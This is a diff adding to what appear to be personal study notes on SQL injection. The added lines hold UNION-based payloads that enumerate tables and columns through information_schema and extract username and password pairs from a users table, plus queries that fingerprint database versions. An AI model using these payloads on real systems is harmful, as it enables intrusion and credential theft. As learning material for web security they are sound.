@@ -31,8 +31,27 @@
     - ' UNION SELECT NULL,'a',NULL,NULL--
     - ' UNION SELECT NULL,NULL,'a',NULL--
     - ' UNION SELECT NULL,NULL,NULL,'a'-- 
+  -found name of tables :
+  ' UNION  SELECT 'a','a' FROM information_schema.tables --
+  -found name of column :
+  ' UNION  SELECT  'a','a'  FROM information_schema.columns where table_name='tablename'--
+  
+  to find name of tables and cloumns in oracle use all_tables , all_tab_columns.
+  
+ 
 
+- Retrieving multiple values within a single column
+   - ' UNION SELECT username || '~' || password FROM users-- 
 # notes:
   - There is a built-in table on Oracle called dual which can be used for this purpose : ' UNION SELECT NULL FROM DUAL-- (MUST in oracle )
   -  the hash character # can be used to identify a comment 
 
+
+# Examining the database in SQL injection attacks:
+ -Microsoft, MySQL 	SELECT @@version
+ -Oracle 	SELECT * FROM v$version
+ -PostgreSQL 	SELECT version() 
+ 
+# Listing the contents of the database:
+ - SELECT * FROM information_schema.tables 
+ - 
